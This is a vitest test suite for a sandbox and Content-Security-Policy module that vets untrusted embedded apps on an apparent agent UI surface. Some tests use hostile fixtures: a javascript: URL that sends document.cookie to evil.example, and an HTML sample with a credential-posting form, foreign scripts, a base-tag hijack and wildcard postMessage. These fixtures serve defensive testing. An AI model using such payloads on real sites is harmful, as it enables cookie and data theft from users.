import { describe, expect, it } from 'vitest';
import {
  DEFAULT_MAX_FRAME_HEIGHT_PX,
  MIN_FRAME_HEIGHT_PX,
  SANDBOX_TOKENS,
  evaluateApp,
  parseAllowedOrigins,
  scanDocument,
  type EvaluateAppInput,
} from '../src/policy.js';
import type { EmbeddedApp } from '@agent-surface/protocol';

const HOST = 'https://surface.example';
const CDN = 'https://cdn.example';
const TOOLS = 'https://tools.surface.example';

/**
 * Deliberately loose: the sandbox value in a real payload comes off the wire,
 * so the tests must be able to hand `evaluateApp` values the IR would never
 * type-check.
 */
function app(overrides: Record<string, unknown> = {}): EmbeddedApp {
  return {
    id: 'mcp-app-weather',
    title: 'Weather',
    src: 'ui://weather/app.html',
    sandbox: 'sandboxed-scripts',
    untrusted: true,
    ...overrides,
  } as EmbeddedApp;
}

function evaluate(overrides: Partial<EvaluateAppInput> = {}) {
  return evaluateApp({
    app: app(),
    hostOrigin: HOST,
    allowedOrigins: [CDN, TOOLS],
    allowUntrustedCode: false,
    html: '<!doctype html><html><head><title>w</title></head><body><h1>hi</h1></body></html>',
    ...overrides,
  });
}

function codes(decision: ReturnType<typeof evaluate>): string[] {
  return decision.findings.map((f) => f.code);
}

function directive(csp: string, name: string): string {
  return new RegExp(`(?:^|;)\\s*${name}([^;]*)`).exec(csp)?.[1]?.trim() ?? '';
}

// ---------------------------------------------------------------------------

describe('policy: sandbox posture', () => {
  it('grants "sandboxed" as declared, with no executable frame and a live bridge channel', () => {
    const d = evaluate({ app: app({ sandbox: 'sandboxed' }) });
    expect(d.allowed).toBe(true);
    expect(d.sandbox).toBe('sandboxed');
    expect(d.sandboxTokens).toBe('');
    expect(d.code).toBe('ALLOWED_AS_DECLARED');
    // postMessage stays on: the host may still push theme/data into a passive frame.
    expect(d.bridge.postMessage).toBe(true);
    // No scripts, so nothing the frame could do is exposed.
    expect(d.bridge.toolInvoke).toBe(false);
    expect(d.bridge.heightResize).toBe(false);
    expect(d.bridge.a2a).toBe(false);
  });

  it('grants "sandboxed-scripts" with toolInvoke and heightResize but not a2a', () => {
    const d = evaluate();
    expect(d.sandbox).toBe('sandboxed-scripts');
    expect(d.sandboxTokens).toBe('allow-scripts');
    expect(d.bridge).toEqual({ postMessage: true, toolInvoke: true, heightResize: true, a2a: false });
  });

  it('grants "sandboxed-forms" but records that form-action "none" makes it inert', () => {
    const d = evaluate({ app: app({ sandbox: 'sandboxed-forms' }) });
    expect(d.sandbox).toBe('sandboxed-forms');
    expect(d.bridge.toolInvoke).toBe(false);
    expect(codes(d)).toContain('DECLARED_SANDBOX_DOWNGRADED');
    expect(d.csp).toContain("form-action 'none'");
  });

  it('REFUSES allow-same-origin on its own and drops to a fully sandboxed frame', () => {
    const d = evaluate({ app: app({ sandbox: 'allow-same-origin' }) });
    expect(d.allowed).toBe(true);
    expect(d.sandbox).toBe('sandboxed');
    expect(d.sandboxTokens).toBe('');
    expect(d.code).toBe('ALLOWED_DOWNGRADED');
    expect(d.reason).toMatch(/REFUSED allow-same-origin/);
    expect(d.findings.some((f) => f.code === 'DECLARED_SANDBOX_DOWNGRADED' && f.message.includes('REFUSED'))).toBe(true);
  });

  it('REFUSES allow-scripts + allow-same-origin: the combination is a sandbox escape, not a sandbox', () => {
    const d = evaluate({ app: app({ sandbox: 'allow-scripts-same-origin' }) });
    expect(d.sandbox).toBe('sandboxed-scripts');
    expect(d.sandboxTokens).toBe('allow-scripts');
    expect(d.sandboxTokens).not.toContain('allow-same-origin');
    expect(d.code).toBe('ALLOWED_DOWNGRADED');
    expect(d.reason).toMatch(/sandbox escape|downgraded/);
    // The frame keeps scripting but runs in an opaque origin.
    expect(d.frame?.origin).toBe('null');
  });

  it('REFUSES allow-all and downgrades to allow-scripts only', () => {
    const d = evaluate({ app: app({ sandbox: 'allow-all' }) });
    expect(d.allowed).toBe(true);
    expect(d.sandbox).toBe('sandboxed-scripts');
    expect(d.sandboxTokens).toBe('allow-scripts');
    for (const dropped of ['allow-same-origin', 'allow-popups', 'allow-downloads', 'allow-modals']) {
      expect(d.sandboxTokens).not.toContain(dropped);
    }
  });

  it('grants the escape only when allowUntrustedCode is explicitly true, and still records it', () => {
    const d = evaluate({ app: app({ sandbox: 'allow-all' }), allowUntrustedCode: true });
    expect(d.allowed).toBe(true);
    expect(d.sandbox).toBe('allow-all');
    expect(d.sandboxTokens).toBe(SANDBOX_TOKENS['allow-all']);
    expect(d.code).toBe('ALLOWED_UNTRUSTED_CODE_ESCALATED');
    expect(d.reason).toMatch(/operator override|not a safe default/);
    expect(d.warnings.some((w) => w.includes('GRANTED'))).toBe(true);
    expect(d.audit.allowUntrustedCode).toBe(true);
  });

  it('resolves an unrecognized sandbox value to the most restrictive posture, never a looser one', () => {
    for (const garbage of ['banana', '', '   ', 'ALLOW-ALL', 'allow-everything']) {
      const d = evaluate({ app: app({ sandbox: garbage }) });
      expect(d.sandbox).toBe('sandboxed');
      expect(d.sandboxTokens).toBe('');
      expect(d.bridge.toolInvoke).toBe(false);
    }
    expect(codes(evaluate({ app: app({ sandbox: 'banana' }) }))).toContain('SANDBOX_VALUE_UNRECOGNIZED');
  });

  it('maps a raw token list onto the most capable IR value it actually contains', () => {
    const d = evaluate({ app: app({ sandbox: 'allow-scripts allow-forms' }) });
    expect(d.sandbox).toBe('sandboxed-scripts');
    expect(codes(d)).toContain('SANDBOX_VALUE_REMAPPED');
  });

  it('always drops navigation tokens, even with allowUntrustedCode on', () => {
    const d = evaluate({
      app: app({ sandbox: 'allow-scripts allow-same-origin allow-top-navigation allow-popups-to-escape-sandbox' }),
      allowUntrustedCode: true,
    });
    expect(d.sandboxTokens).not.toContain('allow-top-navigation');
    expect(d.sandboxTokens).not.toContain('allow-popups-to-escape-sandbox');
    expect(codes(d).filter((c) => c === 'SANDBOX_TOKEN_DROPPED').length).toBeGreaterThanOrEqual(2);
  });

  it('DENIES a frame that would run on the host origin with allow-same-origin', () => {
    const d = evaluate({
      app: app({ sandbox: 'allow-same-origin', src: `${HOST}/app.html` }),
      html: null,
    });
    expect(d.allowed).toBe(false);
    expect(d.code).toBe('DENIED_HOST_ORIGIN_REUSE');
    expect(d.bridge).toEqual({ postMessage: false, toolInvoke: false, a2a: false, heightResize: false });
    expect(d.reason).toMatch(/same-origin with the host/);
  });

  it('DENIES the same host-origin reuse even when allowUntrustedCode is on', () => {
    const d = evaluate({
      app: app({ sandbox: 'allow-scripts-same-origin', src: `${HOST}/app.html` }),
      html: null,
      allowUntrustedCode: true,
    });
    expect(d.allowed).toBe(false);
    expect(d.code).toBe('DENIED_HOST_ORIGIN_REUSE');
  });
});

// ---------------------------------------------------------------------------

describe('policy: frame source', () => {
  it('DENIES a javascript: src unconditionally, even in dev with the master switch on', () => {
    const d = evaluate({ app: app({ src: 'javascript:fetch("//evil.example?c="+document.cookie)' }), html: null, dev: true, allowUntrustedCode: true });
    expect(d.allowed).toBe(false);
    expect(d.code).toBe('DENIED_FRAME_SOURCE');
    expect(d.reason).toMatch(/javascript:/);
  });

  it('allows an https src in production', () => {
    const d = evaluate({ app: app({ src: 'https://apps.example/view.html' }), html: null });
    expect(d.allowed).toBe(true);
    expect(d.frame?.origin).toBe('https://apps.example');
    expect(d.code).toBe('ALLOWED_AS_DECLARED');
  });

  it('allows http://localhost in dev and denies it in prod', () => {
    expect(evaluate({ app: app({ src: 'http://localhost:5173/x' }), html: null, dev: true }).allowed).toBe(true);
    const prod = evaluate({ app: app({ src: 'http://localhost:5173/x' }), html: null });
    expect(prod.allowed).toBe(false);
    expect(prod.reason).toMatch(/development-only/);
  });

  it('DENIES cleartext http to a non-loopback host even in dev', () => {
    const d = evaluate({ app: app({ src: 'http://evil.example/x' }), html: null, dev: true });
    expect(d.allowed).toBe(false);
    expect(d.reason).toMatch(/cleartext/);
  });

  it('DENIES an https URL carrying embedded credentials', () => {
    const d = evaluate({ app: app({ src: 'https://user:pw@apps.example/x' }), html: null });
    expect(d.allowed).toBe(false);
    expect(d.reason).toMatch(/credentials/);
  });

  it('DENIES a relative src, which would resolve against the host origin', () => {
    const d = evaluate({ app: app({ src: '/admin/panel' }), html: null });
    expect(d.allowed).toBe(false);
    expect(d.reason).toMatch(/relative reference/);
  });

  it('DENIES an unresolved ui:// resource: the host must read the body first', () => {
    const d = evaluate({ app: app({ src: 'ui://weather/app.html' }), html: null });
    expect(d.allowed).toBe(false);
    expect(d.reason).toMatch(/resources\/read/);
  });

  it('converts data:text/html into an opaque srcdoc frame and nonces its scripts', () => {
    const d = evaluate({
      app: app({ src: 'data:text/html,<h1>hello</h1><script>go()</script>' }),
      html: null,
    });
    expect(d.allowed).toBe(true);
    expect(d.frame?.kind).toBe('inline');
    expect(d.frame?.origin).toBe('null');
    expect(d.nonce).toMatch(/^[0-9a-f]{32}$/);
    expect(d.csp).toContain(`script-src 'nonce-${d.nonce}'`);
    // style-src needs 'unsafe-inline' (apps ship inline styles); script-src must not.
    expect(directive(d.csp, 'script-src')).not.toContain('unsafe-inline');
    expect(directive(d.csp, 'style-src')).toContain("'unsafe-inline'");
  });

  it('DENIES a data: URL that is not text/html', () => {
    const d = evaluate({ app: app({ src: 'data:text/plain;base64,aGk=' }), html: null });
    expect(d.allowed).toBe(false);
    expect(d.reason).toMatch(/not text\/html/);
  });

  it('DENIES an agent-supplied blob: and allows a host-created one', () => {
    const blob = 'blob:https://surface.example/8f2c';
    expect(evaluate({ app: app({ src: blob }), html: null }).allowed).toBe(false);
    const trusted = evaluate({ app: app({ src: blob }), html: null, trustedBlobUrls: [blob] });
    expect(trusted.allowed).toBe(true);
    expect(trusted.frame?.origin).toBe('null');
    // Opaque remote frame: the host cannot inject a nonce, so it must be told.
    expect(codes(trusted)).toContain('RESOURCE_DOMAIN_REFUSED');
  });

  it('DENIES the app when hostOrigin is not an absolute origin, rather than posting to "*"', () => {
    const d = evaluate({ hostOrigin: 'surface.example' });
    expect(d.allowed).toBe(false);
    expect(d.code).toBe('DENIED_INVALID_HOST_ORIGIN');
    expect(d.csp).not.toContain('*');
  });
});

// ---------------------------------------------------------------------------

describe('policy: bridge features and bounds', () => {
  it('enables a2a only when the app declared that transport and scripts are granted', () => {
    expect(evaluate({ app: app({ transport: 'a2a' }) }).bridge.a2a).toBe(true);
    expect(evaluate({ app: app({ transport: 'postmessage' }) }).bridge.a2a).toBe(false);
    const noScripts = evaluate({ app: app({ transport: 'a2a', sandbox: 'sandboxed' }) });
    expect(noScripts.bridge.a2a).toBe(false);
    expect(noScripts.warnings.some((w) => w.includes("transport 'a2a'"))).toBe(true);
  });

  it('clamps an over-tall frame to maxFrameHeightPx instead of rendering it unbounded', () => {
    const d = evaluate({ app: app({ height: 5000 }) });
    expect(d.allowed).toBe(true);
    expect(d.bounds.heightPx).toBe(DEFAULT_MAX_FRAME_HEIGHT_PX);
    expect(d.bounds.heightClamped).toBe(true);
    expect(codes(d)).toContain('HEIGHT_CLAMPED');
  });

  it('honours a custom maxFrameHeightPx and clamps to it', () => {
    const d = evaluate({ app: app({ height: 5000 }), maxFrameHeightPx: 640 });
    expect(d.bounds.heightPx).toBe(640);
    expect(d.bounds.maxHeightPx).toBe(640);
  });

  it('clamps a negative or absurd height to a safe default rather than trusting it', () => {
    expect(evaluate({ app: app({ height: -900 }) }).bounds.heightPx).toBe(MIN_FRAME_HEIGHT_PX);
    expect(evaluate({ app: app({ height: Number.NaN }) }).bounds.heightPx).toBe(240);
    expect(evaluate({ app: app({ height: Number.POSITIVE_INFINITY }) }).bounds.heightPx).toBe(240);
    expect(evaluate({}).bounds.heightPx).toBe(240);
  });

  it('leaves a legal height untouched', () => {
    const d = evaluate({ app: app({ height: 480 }) });
    expect(d.bounds.heightPx).toBe(480);
    expect(d.bounds.heightClamped).toBe(false);
  });

  it('forces untrusted:true and records the anomaly when an app claims otherwise', () => {
    const d = evaluate({ app: { ...app(), untrusted: false as unknown as true } });
    expect(d.allowed).toBe(true);
    expect(d.audit.grantedSandbox).toBe('sandboxed-scripts');
    expect(codes(d)).toContain('TRUST_CLAIM_IGNORED');
  });
});

// ---------------------------------------------------------------------------

describe('policy: origin allowlist and CSP', () => {
  it('emits every required directive and never unsafe-eval or a wildcard', () => {
    const d = evaluate({ declaredCsp: { resourceDomains: [CDN] } });
    for (const directive of [
      "default-src 'none'",
      'base-uri',
      'object-src',
      'frame-ancestors',
      'form-action',
      'script-src',
      'style-src',
      'img-src',
      'media-src',
      'font-src',
      'connect-src',
    ]) {
      expect(d.csp).toContain(directive);
    }
    expect(d.csp).toContain("default-src 'none'");
    expect(d.csp).toContain("frame-ancestors 'none'");
    expect(d.csp).toContain("form-action 'none'");
    expect(d.csp).toContain("base-uri 'none'");
    expect(d.csp).toContain("object-src 'none'");
    expect(d.csp).toContain("style-src 'unsafe-inline'");
    expect(d.csp).not.toContain('unsafe-eval');
    expect(d.csp).not.toMatch(/[^*]\*[^*]/);
  });

  it('mirrors the granted sandbox tokens into the CSP sandbox directive', () => {
    expect(evaluate().csp).toContain('sandbox allow-scripts;');
    expect(evaluate({ app: app({ sandbox: 'sandboxed' }) }).csp).toMatch(/sandbox;/);
  });

  it('honors declared resourceDomains that are on the allowlist and refuses the rest', () => {
    const d = evaluate({ declaredCsp: { resourceDomains: [CDN, 'https://evil.example'] } });
    expect(d.csp).toContain(CDN);
    expect(d.csp).not.toContain('evil.example');
    expect(codes(d)).toContain('RESOURCE_DOMAIN_REFUSED');
  });

  it('refuses every declared resourceDomain when the allowlist is empty', () => {
    const d = evaluate({ allowedOrigins: [], declaredCsp: { resourceDomains: [CDN] } });
    expect(d.csp).not.toContain(CDN);
    expect(codes(d)).toContain('RESOURCE_DOMAIN_REFUSED');
  });

  it("leaves connect-src at 'none' when the app declared no connect domains", () => {
    const d = evaluate();
    expect(d.csp).toContain("connect-src 'none'");
  });

  it('restricts connect-src to the host tool-invoke endpoint when it is allowlisted', () => {
    const d = evaluate({ toolInvokeOrigin: TOOLS });
    expect(d.csp).toContain(`connect-src ${TOOLS}`);
  });

  it('refuses a toolInvokeOrigin outside the allowlist', () => {
    const d = evaluate({ toolInvokeOrigin: 'https://not-allowed.example' });
    expect(d.csp).toContain("connect-src 'none'");
    expect(codes(d)).toContain('CONNECT_DOMAIN_REFUSED');
  });

  it('refuses declared baseUriDomains outright, because <base> is stripped anyway', () => {
    const d = evaluate({ declaredCsp: { baseUriDomains: [CDN] } });
    expect(d.csp).toContain("base-uri 'none'");
    expect(codes(d)).toContain('BASE_URI_DOMAIN_REFUSED');
  });

  it('refuses declared frameDomains unless the operator allowlists them', () => {
    const refused = evaluate({ declaredCsp: { frameDomains: ['https://youtube.com'] } });
    expect(refused.csp).toContain("frame-src 'none'");
    expect(codes(refused)).toContain('FRAME_DOMAIN_REFUSED');

    const allowed = evaluate({ allowedOrigins: [CDN, TOOLS, 'https://youtube.com'], declaredCsp: { frameDomains: ['https://youtube.com'] } });
    expect(allowed.csp).toContain('frame-src https://youtube.com');
  });

  it('drops allowlist entries it cannot understand rather than widening to them', () => {
    const d = evaluate({ allowedOrigins: ['*', 'nonsense', 'javascript:alert(1)', CDN] });
    expect(d.allowed).toBe(true);
    expect(d.findings.filter((f) => f.code === 'ALLOWED_ORIGIN_IGNORED').length).toBe(3);
    const parsed = parseAllowedOrigins(['*', 'nonsense', 'https://a.example/path?q=1', 'https://*.cdn.example']);
    expect(parsed.rejected).toHaveLength(2);
    expect(parsed.patterns[0]?.source).toBe('https://a.example');
    expect(parsed.patterns[1]?.source).toBe('https://*.cdn.example');
  });
});

// ---------------------------------------------------------------------------

describe('policy: static document scan', () => {
  const hostile = [
    '<!doctype html><html><head><base href="https://evil.example/">',
    '<meta http-equiv="Content-Security-Policy" content="default-src *">',
    '</head><body onload="steal()">',
    '<button onclick="go()">x</button>',
    '<script>window.opener.location = "https://evil.example"; localStorage.getItem("t")</script>',
    '<script src="https://evil.example/x.js"></script>',
    '<script src="https://cdn.example/ok.js"></script>',
    '<form action="https://evil.example/steal" method="post"><input name="a"></form>',
    '<img src="x.png" onerror="eval(1)">',
    '<iframe src="https://evil.example"></iframe>',
    '<a href="javascript:alert(1)">click</a>',
    '<script>window.parent.postMessage(data, "*")</script>',
    '</body></html>',
  ].join('\n');

  it('flags inline event handlers', () => {
    const findings = scanDocument({ html: '<button onclick="go()">x</button>', frameOrigin: 'null', permittedOrigins: [] });
    expect(findings.map((f) => f.code)).toContain('INLINE_EVENT_HANDLER');
  });

  it('flags inline script bodies but not a JSON data block', () => {
    const inline = scanDocument({ html: '<script>run()</script>', frameOrigin: 'null', permittedOrigins: [] });
    expect(inline.map((f) => f.code)).toContain('INLINE_SCRIPT');
    const data = scanDocument({
      html: '<script type="application/json">{"a":1}</script>',
      frameOrigin: 'null',
      permittedOrigins: [],
    });
    expect(data.map((f) => f.code)).not.toContain('INLINE_SCRIPT');
  });

  it('flags window.opener and localStorage access', () => {
    const found = scanDocument({
      html: '<script>window.opener.x=1; localStorage.clear()</script>',
      frameOrigin: 'null',
      permittedOrigins: [],
    });
    const list = found.map((f) => f.code);
    expect(list).toContain('WINDOW_OPENER');
    expect(list).toContain('LOCAL_STORAGE');
  });

  it('flags an external script host that is not allowlisted and stays quiet about one that is', () => {
    const found = scanDocument({
      html: '<script src="https://evil.example/x.js"></script><script src="https://cdn.example/ok.js"></script>',
      frameOrigin: 'null',
      permittedOrigins: [CDN],
    });
    const hosts = found.filter((f) => f.code === 'EXTERNAL_SCRIPT_HOST').map((f) => f.message);
    expect(hosts).toHaveLength(1);
    expect(hosts[0]).toContain('evil.example');
  });

  it('flags a form posting to a third party and not a same-origin one', () => {
    const third = scanDocument({
      html: '<form action="https://evil.example/x"></form>',
      frameOrigin: 'https://apps.example',
      permittedOrigins: [],
    });
    expect(third.map((f) => f.code)).toContain('FORM_THIRD_PARTY');
    const same = scanDocument({
      html: '<form action="https://apps.example/x"></form>',
      frameOrigin: 'https://apps.example',
      permittedOrigins: [],
    });
    expect(same.map((f) => f.code)).not.toContain('FORM_THIRD_PARTY');
  });

  it('flags javascript: and data:text/html URLs, wildcard postMessage, and eval', () => {
    const found = scanDocument({
      html: [
        '<a href="javascript:alert(1)">a</a>',
        '<iframe src="data:text/html,<b>x</b>"></iframe>',
        '<script>window.parent.postMessage(x, "*"); eval("1+1")</script>',
      ].join(''),
      frameOrigin: 'null',
      permittedOrigins: [],
    });
    const list = found.map((f) => f.code);
    expect(list.filter((c) => c === 'UNSAFE_URL').length).toBe(2);
    expect(list).toContain('WILDCARD_POSTMESSAGE');
    expect(list).toContain('DYNAMIC_CODE');
    expect(list).toContain('NESTED_FRAME');
  });

  it('flags an agent-supplied CSP meta and a <base> that the rewriter had to strip', () => {
    const list = codes(evaluate({ html: '<!doctype html><head><base href="https://evil.example/"><meta http-equiv="Content-Security-Policy" content="default-src *"></head><body>x</body>' }));
    expect(list).toContain('PREEXISTING_CSP_META');
    expect(list).toContain('BASE_TAG');
  });

  it('warns but never blocks: a hostile document is still rendered inside a hard sandbox', () => {
    const d = evaluate({ html: hostile });
    expect(d.allowed).toBe(true);
    expect(d.sandbox).toBe('sandboxed-scripts');
    const list = codes(d);
    for (const expected of [
      'INLINE_EVENT_HANDLER',
      'INLINE_SCRIPT',
      'EXTERNAL_SCRIPT_HOST',
      'WINDOW_OPENER',
      'LOCAL_STORAGE',
      'FORM_THIRD_PARTY',
      'UNSAFE_URL',
      'WILDCARD_POSTMESSAGE',
      'DYNAMIC_CODE',
      'NESTED_FRAME',
      'PREEXISTING_CSP_META',
      'BASE_TAG',
    ]) {
      expect(list).toContain(expected);
    }
    expect(d.warnings.length).toBeGreaterThan(8);
    expect(d.reason).toMatch(/high-severity finding/);
  });

  it('never runs the scan at all when there is no document, e.g. a remote https frame', () => {
    const d = evaluate({ app: app({ src: 'https://apps.example/x' }), html: null });
    expect(d.allowed).toBe(true);
    expect(d.csp).toContain("script-src 'self'");
    expect(d.nonce).toBeNull();
    // A document the host did not author cannot be nonced, and the operator
    // needs to know that before the app ships inline scripts.
    expect(codes(d)).toContain('SANDBOX_VALUE_REMAPPED');
    expect(d.warnings.some((w) => w.includes('cannot be nonced'))).toBe(true);
  });

  it('explains every decision in one reason string', () => {
    for (const sandbox of ['sandboxed', 'sandboxed-scripts', 'sandboxed-forms', 'allow-all', 'nonsense']) {
      const d = evaluate({ app: app({ sandbox }) });
      expect(typeof d.reason).toBe('string');
      expect(d.reason.length).toBeGreaterThan(40);
      expect(d.reason).toContain('bridge:');
      expect(d.reason).toContain('frame height');
    }
  });
});
